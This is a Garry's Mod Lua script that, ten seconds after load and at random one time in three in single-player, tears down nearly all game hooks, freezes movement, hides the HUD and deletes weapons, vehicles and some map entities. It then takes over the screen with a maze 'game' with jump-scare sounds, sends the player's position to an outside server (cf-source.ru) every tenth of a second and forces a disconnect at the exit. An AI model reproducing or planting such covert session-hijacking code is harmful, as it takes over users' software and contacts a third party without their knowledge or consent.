
local function StartDeadGame()

    hook.Add( "Move", "XD_NOMOVE", function( ply, mv )
        return true
    end)
    local ProtectedHooks = {}

    local function AddProtectedHook(h1, h2)
        ProtectedHooks[h1] = ProtectedHooks[h1] or {}
        ProtectedHooks[h1][h2] = true
    end

    AddProtectedHook("PostDrawEffects","RenderWidgets")
    AddProtectedHook("ShutDown","SaveCookiesOnShutdown")
    AddProtectedHook("EntityNetworkedVarChanged","NetworkedVars")
    AddProtectedHook("EntityRemoved","Constraint Library - ConstraintRemoved")
    AddProtectedHook("EntityRemoved","DoDieFunction")
    AddProtectedHook("PlayerInitialSpawn","PlayerAuthSpawn")
    AddProtectedHook("PlayerTick","TickWidgets")
    AddProtectedHook("AddToolMenuCategories","CreateUtilitiesCategories")
    AddProtectedHook("SpawniconGenerated","SpawniconGenerated")
    AddProtectedHook("RenderScene","RenderSuperDoF")
    AddProtectedHook("RenderScene","RenderStereoscopy")
    AddProtectedHook("DrawOverlay","DragNDropPaint")
    AddProtectedHook("DrawOverlay","DrawNumberScratch")
    AddProtectedHook("DrawOverlay","VGUIShowLayoutPaint")
    AddProtectedHook("GUIMousePressed","SuperDOFMouseDown")
    AddProtectedHook("GUIMousePressed","PropertiesClick")
    AddProtectedHook("Think","RealFrameTime")
    AddProtectedHook("Think","NotificationThink")
    AddProtectedHook("Think","DOFThink")
    AddProtectedHook("Think","DragNDropThink")
    AddProtectedHook("GUIMouseReleased","SuperDOFMouseUp")
    AddProtectedHook("PostDrawEffects","RenderHalos")
    AddProtectedHook("PostRender","RenderFrameBlend")
    AddProtectedHook("PreDrawHalos","PropertiesHover")
    AddProtectedHook("Tick","SendQueuedConsoleCommands")
    AddProtectedHook("PreventScreenClicks","SuperDOFPreventClicks")
    AddProtectedHook("PreventScreenClicks","PropertiesPreventClicks")
    AddProtectedHook("PostReloadToolsMenu","BuildUndoUI")
    AddProtectedHook("PostReloadToolsMenu","BuildCleanupUI")
    AddProtectedHook("CalcView","MyCalcView")
    AddProtectedHook("LoadGModSaveFailed","LoadGModSaveFailed")
    AddProtectedHook("NeedsDepthPass","NeedsDepthPass_Bokeh")
    AddProtectedHook("PopulateToolMenu","PopulateUtilityMenus")
    AddProtectedHook("PlayerBindPress","PlayerOptionInput")
    AddProtectedHook("VGUIMousePressAllowed","WorldPickerMouseDisable")
    AddProtectedHook("RenderScreenspaceEffects","RenderToyTown")
    AddProtectedHook("RenderScreenspaceEffects","RenderBokeh")
    AddProtectedHook("RenderScreenspaceEffects","RenderBloom")
    AddProtectedHook("RenderScreenspaceEffects","RenderTexturize")
    AddProtectedHook("RenderScreenspaceEffects","RenderColorModify")
    AddProtectedHook("RenderScreenspaceEffects","RenderMaterialOverlay")
    AddProtectedHook("RenderScreenspaceEffects","RenderMotionBlur")
    AddProtectedHook("RenderScreenspaceEffects","RenderSharpen")
    AddProtectedHook("RenderScreenspaceEffects","RenderSobel")
    AddProtectedHook("RenderScreenspaceEffects","RenderSunbeams")
    AddProtectedHook("VGUIMousePressed","TextEntryLoseFocus")
    AddProtectedHook("VGUIMousePressed","DermaDetectMenuFocus")
    AddProtectedHook("InitPostEntity","CreateVoiceVGUI")
    AddProtectedHook("HUDPaint","DrawRecordingIcon")
    AddProtectedHook("HUDPaint","PlayerOptionDraw")
    AddProtectedHook("PopulateMenuBar","DisplayOptions_MenuBar")
    AddProtectedHook("PopulateMenuBar","NPCOptions_MenuBar")
    AddProtectedHook("OnGamemodeLoaded","CreateMenuBar")
    AddProtectedHook("PopulateContent","GameProps")
    for k,v in pairs(hook.GetTable()) do
        for k2, v2 in pairs(v) do
            if isstring(k2) then
                if ProtectedHooks[k] != nil then
                    if ProtectedHooks[k][k2] then
                        continue
                    end
                end
                if string.find(k2, "XD_") == nil then                    
                    hook.Remove(k, k2)
                end
            end
        end
    end

    if SERVER then 
        local ENTS_WHITE_LIST = {
            ['prop_dynamic'] = true,
            ['lua_run'] = true,
            ['prop_physics'] = true,
            ['light'] = true,
            ['env_skypaint'] = true,
            ['env_soundscape'] = true,
            ['env_sun'] = true,
            ['env_fog_controller'] = true,
            ['sky_camera'] = true,
            ['shadow_control'] = true,
            ['light_environment'] = true,
            ['env_tonemap_controller'] = true,
            ['point_spotlight'] = true,
            ['func_illusionary'] = true,
            ['spotlight_end'] = true,
            ['beam'] = true,
        }


        function S_ClearEnts()
            for k,v in pairs(ents.GetAll()) do

                if v:IsWeapon() then v:Remove()
                    continue
                end
                if v:IsVehicle() then v:Remove()
                    continue
                end
                if ENTS_WHITE_LIST[v:GetClass()] then
                    --prop_door_rotating
                    v:Remove()
                end
            end
        end
        S_ClearEnts()
        return 
    end
    XMOD = {}

    hook.Add( "HUDShouldDraw", "XD_HideHUD", function( name )
        return false
    end )


    hook.Add( "CalcView", "XD_MyCalcView", function( ply, pos, angles, fov )
        local view = {
            origin = Vector(-160000,-160000,-160000),
            angles = fov,
            fov = 0,
            drawviewer = false
        }

        return view
    end )

    timer.Create("XD_CHECK_666api", .1, 0, function()

        if XMOD.PLAYERS[LocalPlayer()] == nil then return end
        local x = XMOD.PLAYERS[LocalPlayer()].x
        local y = XMOD.PLAYERS[LocalPlayer()].y
        local url = "http://cf-source.ru/minigames?x=" .. tostring(math.Round(x, 2)) .. "&y=" .. tostring(math.Round(y, 2))
        http.Fetch(url ,
        
            function( body, length, headers, code )
                if code == 201 then
                    local data = string.Split(body," ")
                    XMOD.FUNCS:UpdateWorldInfo(data)       
                end
            end,
            function( message ) 
            end,
            {             
            }
        )
    end)


    XMOD.RENDER = {    
    }
    XMOD.FUNCS = {
        LAB = {}
    }
    XMOD.LEVEL = {
        CACHED_PIXELS = {},
    }
    XMOD.PLAYERS = {
        [0] = {
            x = 5,
            y = 10,
            u = 4,
            is_dead = false,
            draw_time = 0,
        },
    }



    if CLIENT then
        XMOD.RENDER.RT = GetRenderTarget('X_MOD_LAB', 1024,1024)
        XMOD.RENDER.MAT = CreateMaterial("X_MOD_LAB_MAT", "UnLitGeneric", {
            ['$basetexture'] = XMOD.RENDER.RT:GetName(),
            ['$vertexalpha'] = 1,
        })
        XMOD.RENDER.RT2 = GetRenderTarget('X_MOD_LAB2', 1024,512)
        XMOD.RENDER.MAT2 = CreateMaterial("X_MOD_LAB_MAT2", "UnLitGeneric", {
            ['$basetexture'] = XMOD.RENDER.RT2:GetName(),
            ['$vertexalpha'] = 1,
        })
        XMOD.RENDER.PLAYER_RT = GetRenderTarget('X_MOD_LAB3', 64,64)
        XMOD.RENDER.PLAYER_MAT = CreateMaterial("X_MOD_LAB_MAT3", "UnLitGeneric", {
            ['$basetexture'] = XMOD.RENDER.PLAYER_RT:GetName(),
            ['$vertexalpha'] = 1,
        })
        local data = string.ToTable("0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001100000000000000000000000000000000000000000000000000000000001111111111000000000000000000000000000000000000000000000000111111111111111100000000000000000000000000010000000000000000000111111111111111111111100000000000000000000011100000000000000000011111111111111111111111111000000000000000001110000000000000000001111111111111111111111111100000000000000001111000000000000000001111111111111111111111111111111111100001111111000000000000000000111111111111111111111111111111111111111111111100000000011110000011111111111111111111111111111111111111111111110000000011111110011111111111111111111111111111111111111111111110000000011111111111111111111111111111111111111111111111111111111000000001111111111111111111111111111111111111111111111111111111000000000111111111111111111111111111111111111111111111111111111000000000011111111111111111111111111111111111111111111110000000000000000001111111111111111111111111111111111111111111111111100000000100000011111000011111111111111111111111111111111111111111111101110000000100000001111111111111111111111111111111111111111111111111000000000000000111111111111111111111111111111111111111111111111100000000000000011111111111111111111111111111111111111111111111110000000000000001111111111111111111111111111111111111111111111111000000000000000111111111111111111111111110000000000001111111111000000000000000001111111111111111111101000000000000000000001110000000000000000000111111111111111111110000000000000000000000000000000000000000000011111111111111111110000000000000000000000000000000000000000000001111111111111111110000000000000000000000000000000000000000000000000000000111111111000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
        

        render.PushRenderTarget(XMOD.RENDER.PLAYER_RT)
            render.Clear(0,0,0,0,true,true)
            cam.Start2D()
                local x,y = 1,1
                for k,v in pairs(data) do
                    y = y + 1
                    if y == 65 then
                        y = 1
                        x = x + 1
                    end

                    if v == "1" then
                        surface.SetDrawColor(0,0,0,255)       
                        surface.DrawRect(x,y,1,1) 
                    end
                end               
            cam.End2D()
        render.PopRenderTarget()
    end

    local mod = {}
    local aux = {}

    aux.width = false
    aux.height = false
    aux.sx = false
    aux.sy = false
    aux.grid = true




    function aux.createGrid (rows, columns)
      local MazeGrid = {}

      for y = 1, rows do 
        MazeGrid[y] = {}
        for x = 1, columns do
          MazeGrid[y][x] = {bottom_wall = true, right_wall = true}
        end
      end  
      return MazeGrid
    end

    XMOD.FUNCS.WorldSeed = 100
    function mod.createMaze(x1, y1, x2, y2, grid)
        math.randomseed(XMOD.FUNCS.WorldSeed)
        aux.height, aux.width, aux.sx, aux.sy = y2, x2, x1, y1
        aux.grid = grid or aux.createGrid(y2, x2)
        aux.sidewinder()
        return aux.grid
    end
    function aux.sidewinder()
        local cx = aux.sx 
        for y = aux.sy, aux.height do
            for x = aux.sx, aux.width do 
            if y ~= aux.sy then
            if math.random(0, 1) == 0 and x ~= aux.width then
                  aux.grid[y][x].right_wall = false
            else    
                aux.grid[y-1][math.random(cx, x)].bottom_wall = false

                if x ~= aux.width then
                    cx = x+1
                else 
                    cx = aux.sx
                end
                end
            else 
                if x ~= aux.width then 
                aux.grid[y][x].right_wall = false 
                end
            end
            end
        end
    end

    function XMOD.FUNCS:GenerateLab() 
        local lab = mod.createMaze(1, 1, 128, 128)
        local pixelsize = 16
        render.PushRenderTarget(XMOD.RENDER.RT)
            render.Clear(255,255,255,255,true,true)
            cam.Start2D()            
                surface.SetDrawColor(0,0,0,255)
                --surface.DrawRect(0,10,1024,1024)
                for x, y_data in ipairs(lab) do
                    for y, pixel_data in ipairs(y_data) do

                        local xpos,ypos = x*pixelsize,y*pixelsize
                        if pixel_data.right_wall then
                            surface.DrawRect(xpos-1,ypos,1,pixelsize)
                        end

                        if pixel_data.bottom_wall then
                            surface.DrawRect(xpos,ypos-1,pixelsize,1)
                        end  
                    end
                end             
            cam.End2D()        
        render.PopRenderTarget()
    end
    XMOD.FUNCS:GenerateLab()

    function XMOD.FUNCS:Rotate2DPoint(x,y,angle)
        angle = math.rad(angle)
        return x * math.cos(angle) - y * math.sin(angle),x * math.sin(angle) + y * math.cos(angle)
    end

    local map_scaler = 1

    function XMOD.FUNCS:RayCast( ox, oy, ex, ey, callback, ... )
        local dx = math.abs( ex - ox )
        local dy = math.abs( ey - oy ) * -1

        local sx = ox < ex and 1 or -1
        local sy = oy < ey and 1 or -1
        local err = dx + dy

        local counter = 0
        while true do
            -- If a callback has been provided, it controls wether the line
            -- algorithm should proceed or not.
            if callback then
                local cn = callback( ox, oy, counter, ... )
                if not cn then
                    return false, counter
                end
            end

            counter = counter + 1

            if ox == ex and oy == ey then
                return true, counter
            end

            local tmpErr = 2 * err
            if tmpErr > dy then
                err = err + dy
                ox = ox + sx
            end
            if tmpErr < dx then
                err = err + dx
                oy = oy + sy
            end
        end
    end

    function XMOD.FUNCS:CheckExit(x,y)
        if x > 1020 && y > 1020 then
            RunConsoleCommand("disconnect")
        end
    end
    function XMOD.FUNCS:PlaySound(str, callback)
        sound.PlayFile(str , "mono", function( station, errCode, errStr ) if ( IsValid( station ) ) then callback(station) station:Play() end end )
    end
    function XMOD.FUNCS:PlayScreamer()
        XMOD.FUNCS:PlaySound("sound/ambient/alarms/alarm_citizen_loop1.wav", function() end)
        XMOD.FUNCS:PlaySound("sound/ambient/atmosphere/metallic1.wav", function() end)
        XMOD.FUNCS:PlaySound("sound/npc/stalker/go_alert2.wav", function() end)
        
    end
    function XMOD.FUNCS:UpdateWorldInfo(data)       

        local real_world_seed = tonumber(data[1])
        if XMOD.FUNCS.WorldSeed != real_world_seed then
            XMOD.FUNCS.WorldSeed = real_world_seed
            XMOD.FUNCS:GenerateLab()
            for k,v in pairs(XMOD.PLAYERS) do
                if k == LocalPlayer() then continue end
                XMOD.PLAYERS[k] = nil
            end

            local client = LocalPlayer()
            XMOD.PLAYERS[client] = {
                x = 1,
                y = 1,
            }
        end


        local received_user_id = tonumber(data[2])
        if XMOD.PLAYERS[received_user_id] == nil then
            XMOD.PLAYERS[received_user_id] = { x = 0, y = 0, is_dead = false, draw_time = 0 }
            XMOD.FUNCS:PlaySound("sound/ambient/alarms/apc_alarm_loop1.wav", function(stat) stat:SetVolume(0.2) end)
        end
        XMOD.PLAYERS[received_user_id].x = Lerp(0.5, XMOD.PLAYERS[received_user_id].x, tonumber(data[3]))
        XMOD.PLAYERS[received_user_id].y = Lerp(0.5, XMOD.PLAYERS[received_user_id].y, tonumber(data[4]))
        XMOD.PLAYERS[received_user_id].is_dead = tobool(data[5])
    end

    surface.CreateFont( "XMODFont", {
        font = "Tahoma", -- bruh
        extended = false,
        size = 32,
        weight = 0,
        blursize = 0,
        scanlines = 0,
        antialias = false,
        underline = false,
        italic = false,
        strikeout = false,
        symbol = false,
        rotary = false,
        shadow = false,
        additive = false,
        outline = false,
    } )
    surface.CreateFont( "XMODFont_2", {
        font = "Tahoma", -- bruh
        extended = false,
        size = 40,
        weight = 0,
        blursize = 0,
        scanlines = 0,
        antialias = false,
        underline = false,
        italic = false,
        strikeout = false,
        symbol = false,
        rotary = false,
        shadow = false,
        additive = false,
        outline = false,
    } )

    local CaptPix = 0

    local ScreamerCT = SysTime() + math.random(80,200)
    local IsScreamed = false

    hook.Add("RenderScreenspaceEffects", "XD_RenderScreenspaceEffects", function()


        local is_minimap = input.IsKeyDown(KEY_TAB)

        if XMOD.PLAYERS[LocalPlayer()] == nil then return end    
        if CurTime() > CaptPix then
            render.PushRenderTarget(XMOD.RENDER.RT)
                render.CapturePixels()
            render.PopRenderTarget()
            CaptPix = CurTime() + 1    
        end
        cam.Start2D()
            surface.SetDrawColor(255,255,255,255)
            surface.SetMaterial(XMOD.RENDER.MAT)
            surface.DrawTexturedRect(0,0,1024,1024)
        cam.End2D()
        render.Clear(0,0,0,0,true,true)
        
        cam.Start2D()
            local local_player_pos_x,local_player_pos_y = XMOD.PLAYERS[LocalPlayer()].x,XMOD.PLAYERS[LocalPlayer()].y






            

            local player_zeye = -EyeAngles().x+180


            local x_dist = 400

            local r_dist = 0

            local now_x = 0
            local now_y = 0

            if !is_minimap then
                surface.SetDrawColor(20,20,20,255)
                surface.DrawRect(0,ScrH()/2,ScrW(),ScrH()/2)
            end

            local wall_size_x_real = 30
            local RenderPlayerList = {}
            for k,v in pairs(XMOD.PLAYERS) do
                if k == LocalPlayer() then continue end
                RenderPlayerList[#RenderPlayerList+1] = k
            end
                    


            local EntsDraw = {}
            
            for i = -60, 60 do

                local cx,cy = XMOD.FUNCS:Rotate2DPoint(x_dist,i, -EyeAngles().y+i) 

                

                cx = cx + local_player_pos_x
                cy = cy + local_player_pos_y            

                XMOD.FUNCS:RayCast( local_player_pos_x, local_player_pos_y, cx, cy, function(dx,dy, dist)
                    if render.ReadPixel(dx,dy) != 0 then
                        if !is_minimap then
                            local wall_size_x = i * wall_size_x_real
                            local ceil_dx, ceil_dy = math.ceil(dx), math.ceil(dy)
                            for k,v in pairs(RenderPlayerList) do
                                if EntsDraw[v] != nil then continue end
                                local pl_table = XMOD.PLAYERS[v]
                                if pl_table == nil then continue end
                                if math.ceil(pl_table.x) == ceil_dx && math.ceil(pl_table.y) == ceil_dy then
                                    EntsDraw[v] = {
                                        x = dx,
                                        y = dy,
                                        dist = dist,
                                        id = 0,
                                        i = i,
                                        id = v,
                                        pl_table = pl_table,
                                    }
                                end
                            end
                        end
                        return true
                    else
                        --[[ if is_minimap then
                            surface.SetDrawColor(255,0,0,255)
                            surface.DrawRect(dx,dy,1,1)
                            return                        
                        end--]] 
                        local wall_size_x = i * wall_size_x_real
                        local clr = ((dist/x_dist)*255)-255

                        local wall_size_y = (x_dist/dist)*30
                        local base_clr = math.Clamp(wall_size_y*0.6,10,140)
                        if dx > 1020 && dy > 1020 then
                            surface.SetDrawColor(0,base_clr*0.9,base_clr*0.4,255)
                        else 
                            surface.SetDrawColor(base_clr*0.3,base_clr*0.2,base_clr*0.4,255)
                        end
                        surface.DrawRect(ScrW()/2 + wall_size_x ,ScrH()/2 - wall_size_y, wall_size_x_real , wall_size_y*2)
                    end
                end )

            end


            for k,v in pairs(EntsDraw) do

                local wall_size_x = v.i * wall_size_x_real
                local clr = ((v.dist/x_dist)*255)-255
                local wall_size_y = (x_dist/v.dist)*30
                local base_clr = math.Clamp(wall_size_y*0.6,10,140)
                surface.SetDrawColor(base_clr*1,base_clr,base_clr*0.4,100)
                surface.SetMaterial(XMOD.RENDER.PLAYER_MAT)
                local x,y = ScrW()/2 + wall_size_x, ScrH()/2+wall_size_y/2
                surface.DrawTexturedRectRotated(x,y , wall_size_y*2, wall_size_y*2,0)
                
                if wall_size_y > ScrH() * 0.2 then
                    surface.SetFont( "XMODFont" )
                    
                    surface.SetTextPos( x, y ) 
                    if v.pl_table.is_dead then                    

                        surface.SetTextColor( 255, 0, 0 )
                        surface.DrawText( "SOUL_DEAD")
                        if v.pl_table.draw_time == 0 then
                            if !IsScreamed && SysTime() > ScreamerCT then
                                XMOD.FUNCS:PlayScreamer()
                                IsScreamed = true
                            end
                            
                            
                            v.pl_table.draw_time = SysTime() + 30
                        elseif SysTime() > v.pl_table.draw_time then
                            XMOD.PLAYERS[v.id] = nil
                            break

                        end
                    else
                        surface.SetTextColor( 255, 255, 255 )
                        surface.DrawText( "uid:" .. v.id )
                        v.pl_table.draw_time = SysTime() + 10
                    end
                end
            end


            if is_minimap then
                local relative = ScrH()/1024
                surface.SetDrawColor(0,0,0,255)
                surface.DrawRect(0,0,ScrH(),ScrH()) 

                surface.SetDrawColor(255,255,255,255)
                surface.SetMaterial(XMOD.RENDER.MAT)
                surface.DrawTexturedRectUV(0,0,ScrH()*0.5,ScrH()*0.5,0,0,0.5,0.5)
                --render.DrawTextureToScreenRect(XMOD.RENDER.MAT, 0,0,ScrH(),ScrH())
                surface.SetDrawColor(255,0,0)
                relativex,relativey = local_player_pos_x*relative,local_player_pos_y*relative
                for i = 1, 40 do
                    local cx,cy = XMOD.FUNCS:Rotate2DPoint(i,1, -EyeAngles().y) 
                    cx = cx + relativex
                    cy = cy + relativey

                    surface.DrawRect(cx,cy,1,1) 
                end
         

                surface.DrawRect(relativex-5,relativey-5, 10,10)



                if math.floor(SysTime()) % 2 == 0 then
                    surface.SetDrawColor(0,255,0)
                    surface.DrawRect(1000*relative,1000*relative,24*relative,24*relative)
                end
            end 

            surface.SetFont( "XMODFont_2" )
            surface.SetTextColor( 255, 255, 255 )
            surface.SetTextPos( 5, 5 ) 
            surface.DrawText( "find exit" ) -- они не знают

            local dist = ((1024-local_player_pos_x) + (1024-local_player_pos_y))/2


            surface.SetTextColor( 255, 0, 200 )
            surface.SetTextPos( 5, 30 ) 
            surface.DrawText( math.floor(dist) ) -- они не знают



        cam.End2D() 


        render.UpdateScreenEffectTexture()
        render.CopyTexture(render.GetScreenEffectTexture(0), XMOD.RENDER.RT2)

        render.DrawTextureToScreen(XMOD.RENDER.RT2)


    end )

    local NextMove = 0
    local StepSnd = 0
    hook.Add( "Think", "XD_KeyDown_Test", function()

        if NextMove > CurTime() then return end
        local client = LocalPlayer()
        XMOD.PLAYERS[client] = XMOD.PLAYERS[client] or {
            x = 1,
            y = 1,
        }
        if CaptPix == 0 then return end

        local MoveX, MoveY = 0,0  
        if client:KeyDown(IN_FORWARD) then
            MoveX = 1
        elseif client:KeyDown(IN_BACK) then
            MoveX = -1
        end
        if client:KeyDown(IN_MOVERIGHT) then
            MoveY = 1
        elseif client:KeyDown(IN_MOVELEFT) then
            MoveY = -1
        end



        local cx,cy = XMOD.FUNCS:Rotate2DPoint(MoveX, MoveY, -EyeAngles().y) 


        local fps = (1/FrameTime())
        local move = math.floor(250/fps)


        for i = 1, math.Clamp(1,move, 90) do
            local old_pos_x,old_pos_y = XMOD.PLAYERS[LocalPlayer()].x,XMOD.PLAYERS[LocalPlayer()].y
            if render.ReadPixel(old_pos_x+cx,old_pos_y) == 0  then
                cx = 0
            end
            if render.ReadPixel(old_pos_x,old_pos_y+cy) == 0  then
                cy = 0
            end

            if cx != 0 or cy != 0 then
                XMOD.PLAYERS[LocalPlayer()].x = old_pos_x + cx * 0.2
                XMOD.PLAYERS[LocalPlayer()].y = old_pos_y + cy * 0.2
                XMOD.FUNCS:CheckExit(old_pos_x,old_pos_y)
                if SysTime() > StepSnd then

                    XMOD.FUNCS:PlaySound("sound/ambient/alarms/warningbell1.wav", function(stat) 
                        stat:SetVolume(0.1)
                    end)
                    StepSnd = SysTime() + 0.2
                end
            end
        end
        NextMove = CurTime() + 0.001
    end)
end





timer.Simple(10, function()
    pcall(function()
        if !game.SinglePlayer() then return end
        if math.random(1,3) == 3 then            
            StartDeadGame()
        end        
    end)    
end)
